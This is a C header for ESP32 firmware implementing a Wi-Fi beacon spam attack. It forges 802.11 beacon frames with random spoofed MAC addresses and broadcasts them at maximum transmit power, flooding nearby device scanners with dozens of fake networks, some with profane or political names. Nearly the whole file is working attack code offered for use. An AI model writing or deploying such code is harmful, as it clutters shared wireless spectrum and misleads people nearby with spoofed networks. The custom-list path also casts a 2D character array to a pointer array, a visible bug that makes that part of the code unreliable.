// wifi_spam.h - Beacon Spam Attack (Max Visibility)
#ifndef WIFI_SPAM_H
#define WIFI_SPAM_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define MAX_CUSTOM_SSIDS 500
#define MAX_BEACON_ENTRIES 200  // Max unique beacons (SSID+MAC pairs)

static const char *SPAM_TAG = "WiFi_Spam";
static uint8_t spam_running = 0;
static TaskHandle_t spam_task_handle = NULL;

typedef struct {
    uint8_t tx_power;           // 8-84 (2dBm - 21dBm)
    uint16_t beacon_interval;   // ms between full cycles
    uint8_t per_ssid_delay;     // ms between individual beacons (lower = faster)
    uint8_t burst_count;        // Times to send each beacon per cycle
    uint8_t duplicates;         // Extra copies of each SSID with different MACs (1-10)
    uint8_t use_custom_list;    // 1=custom, 0=default
    uint8_t randomize_order;    // Shuffle send order each cycle
} SpamConfig;

static SpamConfig spam_config = {
    .tx_power = 84,
    .beacon_interval = 10,     // 10ms between full cycles
    .per_ssid_delay = 1,       // 1ms between beacons
    .burst_count = 2,          // 2 bursts per beacon
    .duplicates = 3,           // 3 copies per SSID = 60 visible networks with defaults
    .use_custom_list = 0,
    .randomize_order = 1,
};

// Default SSIDs
static const char *default_ssids[] = {
    "Fuck ICE",
    "I'm like 90% sure no one likes Mrs. Edwards",
    "NSA Listening Post",
    "The Glowies Are Everywhere",
    "Theres no limit to the larp",
    "Martin Router King",
    "I'm not funny",
    "404 Network Unavailable",
    "I'm bored",
    "No Stewie",
    "It Burns When IP",
    "Iron Man Dies",
    "Fly Me To The Moon",
    "I didn't do it",
    "Anarchy isn't terrorism",
    "Get Off My LAN",
    "House LANister",
    "Winternet Is Coming",
    "No More Mr WiFi",
    "Router? I Barely Know Her"
};

#define NUM_DEFAULT_SSIDS (sizeof(default_ssids) / sizeof(default_ssids[0]))

static char custom_ssids[MAX_CUSTOM_SSIDS][33];
static uint8_t custom_ssid_count = 0;

// Pre-computed beacon entry: SSID + fixed MAC pair
typedef struct {
    char ssid[33];
    uint8_t mac[6];
} BeaconEntry;

static BeaconEntry beacon_entries[MAX_BEACON_ENTRIES];
static uint16_t beacon_entry_count = 0;

// Build beacon table: each SSID gets `duplicates` entries with unique MACs
static void spam_build_beacon_table(void) {
    const char **ssid_list;
    uint8_t ssid_count;

    if (spam_config.use_custom_list && custom_ssid_count > 0) {
        ssid_list = (const char **)custom_ssids;
        ssid_count = custom_ssid_count;
    } else {
        ssid_list = default_ssids;
        ssid_count = NUM_DEFAULT_SSIDS;
    }

    beacon_entry_count = 0;
    uint8_t dups = spam_config.duplicates;
    if (dups < 1) dups = 1;
    if (dups > 10) dups = 10;

    for (uint8_t i = 0; i < ssid_count && beacon_entry_count < MAX_BEACON_ENTRIES; i++) {
        for (uint8_t d = 0; d < dups && beacon_entry_count < MAX_BEACON_ENTRIES; d++) {
            BeaconEntry *e = &beacon_entries[beacon_entry_count];
            strncpy(e->ssid, ssid_list[i], 32);
            e->ssid[32] = '\0';

            // Unique MAC per entry, locally administered unicast
            esp_fill_random(e->mac, 6);
            e->mac[0] = (e->mac[0] & 0xFE) | 0x02;

            beacon_entry_count++;
        }
    }

    ESP_LOGI(SPAM_TAG, "Built %d beacon entries (%d SSIDs x %d duplicates)",
             beacon_entry_count, ssid_count, dups);
}

// Fisher-Yates shuffle
static void spam_shuffle_entries(void) {
    for (uint16_t i = beacon_entry_count - 1; i > 0; i--) {
        uint16_t j = esp_random() % (i + 1);
        BeaconEntry tmp = beacon_entries[i];
        beacon_entries[i] = beacon_entries[j];
        beacon_entries[j] = tmp;
    }
}

// Send a single beacon frame with proper tags so scanners pick it up
static void send_beacon(const char *ssid, const uint8_t *mac) {
    uint8_t packet[128];
    uint16_t pos = 0;

    // MAC header (24 bytes)
    packet[pos++] = 0x80; packet[pos++] = 0x00; // Frame Control: Beacon
    packet[pos++] = 0x00; packet[pos++] = 0x00; // Duration
    memset(&packet[pos], 0xFF, 6); pos += 6;     // Destination: broadcast
    memcpy(&packet[pos], mac, 6); pos += 6;      // Source
    memcpy(&packet[pos], mac, 6); pos += 6;      // BSSID
    static uint16_t seq = 0;
    packet[pos++] = (seq & 0x0F) << 4;
    packet[pos++] = (seq >> 4) & 0xFF;
    seq++;

    // Fixed parameters (12 bytes)
    uint64_t ts = esp_timer_get_time();
    memcpy(&packet[pos], &ts, 8); pos += 8;
    packet[pos++] = 0x64; packet[pos++] = 0x00; // Beacon interval 100 TU
    packet[pos++] = 0x21; packet[pos++] = 0x04; // Capability: ESS + short preamble

    // SSID tag
    size_t ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    packet[pos++] = 0x00;
    packet[pos++] = ssid_len;
    memcpy(&packet[pos], ssid, ssid_len); pos += ssid_len;

    // Supported Rates (makes scanners treat it as real)
    packet[pos++] = 0x01;
    packet[pos++] = 0x08;
    packet[pos++] = 0x82; packet[pos++] = 0x84;
    packet[pos++] = 0x8B; packet[pos++] = 0x96;
    packet[pos++] = 0x24; packet[pos++] = 0x30;
    packet[pos++] = 0x48; packet[pos++] = 0x6C;

    // DS Parameter Set (channel)
    packet[pos++] = 0x03;
    packet[pos++] = 0x01;
    packet[pos++] = 0x06;

    esp_wifi_80211_tx(WIFI_IF_AP, packet, pos, false);
}

// Main spam task - blasts all beacons as fast as possible
static void spam_task(void *param) {
    spam_build_beacon_table();

    ESP_LOGI(SPAM_TAG, "Spam started: %d beacons, burst=%d, delay=%dms",
             beacon_entry_count, spam_config.burst_count, spam_config.per_ssid_delay);

    while (spam_running) {
        if (spam_config.randomize_order) {
            spam_shuffle_entries();
        }

        for (uint16_t i = 0; i < beacon_entry_count && spam_running; i++) {
            BeaconEntry *e = &beacon_entries[i];

            for (uint8_t b = 0; b < spam_config.burst_count; b++) {
                send_beacon(e->ssid, e->mac);
                if (b < spam_config.burst_count - 1) {
                    vTaskDelay(pdMS_TO_TICKS(1));
                }
            }

            if (spam_config.per_ssid_delay > 0) {
                vTaskDelay(pdMS_TO_TICKS(spam_config.per_ssid_delay));
            } else {
                taskYIELD();
            }
        }

        if (spam_config.beacon_interval > 0) {
            vTaskDelay(pdMS_TO_TICKS(spam_config.beacon_interval));
        }
    }

    ESP_LOGI(SPAM_TAG, "Spam task stopped");
    spam_task_handle = NULL;
    vTaskDelete(NULL);
}

// --- Public API ---

static inline SpamConfig* spam_get_config(void) {
    return &spam_config;
}

static inline void spam_set_tx_power(uint8_t power) {
    if (power < 8) power = 8;
    if (power > 84) power = 84;
    spam_config.tx_power = power;
    if (spam_running) esp_wifi_set_max_tx_power(power);
}

static inline void spam_set_interval(uint16_t interval_ms) {
    if (interval_ms > 1000) interval_ms = 1000;
    spam_config.beacon_interval = interval_ms;
}

static inline void spam_set_per_ssid_delay(uint8_t delay_ms) {
    spam_config.per_ssid_delay = delay_ms;
}

static inline void spam_set_burst(uint8_t burst) {
    if (burst < 1) burst = 1;
    if (burst > 10) burst = 10;
    spam_config.burst_count = burst;
}

static inline void spam_set_duplicates(uint8_t dups) {
    if (dups < 1) dups = 1;
    if (dups > 10) dups = 10;
    spam_config.duplicates = dups;
}

static inline void spam_set_random_macs(uint8_t enable) {
    spam_config.randomize_order = enable;
}

static inline uint8_t spam_add_custom_ssid(const char *ssid) {
    if (custom_ssid_count >= MAX_CUSTOM_SSIDS) return 0;
    strncpy(custom_ssids[custom_ssid_count], ssid, 32);
    custom_ssids[custom_ssid_count][32] = '\0';
    custom_ssid_count++;
    return 1;
}

static inline void spam_clear_custom_ssids(void) {
    custom_ssid_count = 0;
}

static inline void spam_use_custom_list(uint8_t enable) {
    spam_config.use_custom_list = enable;
}

static inline uint8_t spam_get_ssid_count(void) {
    return spam_config.use_custom_list ? custom_ssid_count : NUM_DEFAULT_SSIDS;
}

static inline uint16_t spam_get_beacon_count(void) {
    return beacon_entry_count;
}

static inline void spam_rebuild(void) {
    spam_build_beacon_table();
}

static inline uint8_t spam_start(void) {
    if (spam_running) return 0;
    if (spam_config.use_custom_list && custom_ssid_count == 0) return 0;

    static uint8_t wifi_init_done = 0;
    if (!wifi_init_done) {
        ESP_ERROR_CHECK(esp_netif_init());
        ESP_ERROR_CHECK(esp_event_loop_create_default());

        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        ESP_ERROR_CHECK(esp_wifi_init(&cfg));
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

        wifi_config_t ap_cfg = {0};
        ap_cfg.ap.channel = 6;
        ap_cfg.ap.max_connection = 0;
        ap_cfg.ap.ssid_hidden = 1;
        ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
        ap_cfg.ap.ssid[0] = '\0';
        ap_cfg.ap.ssid_len = 0;
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg));

        ESP_ERROR_CHECK(esp_wifi_start());
        wifi_init_done = 1;
    }

    esp_wifi_set_max_tx_power(spam_config.tx_power);
    spam_running = 1;

    BaseType_t result = xTaskCreate(spam_task, "spam_task", 4096, NULL, 5, &spam_task_handle);
    if (result != pdPASS) {
        spam_running = 0;
        return 0;
    }

    return 1;
}

static inline void spam_stop(void) {
    if (!spam_running) return;
    spam_running = 0;
    uint8_t wait = 0;
    while (spam_task_handle != NULL && wait < 50) {
        vTaskDelay(pdMS_TO_TICKS(100));
        wait++;
    }
}

static inline uint8_t spam_is_running(void) {
    return spam_running;
}

// Legacy compat stubs
static inline void spam_set_simultaneous(uint8_t count) {
    (void)count;
}
static inline void spam_set_rotation(uint16_t seconds) {
    (void)seconds;
}

#endif
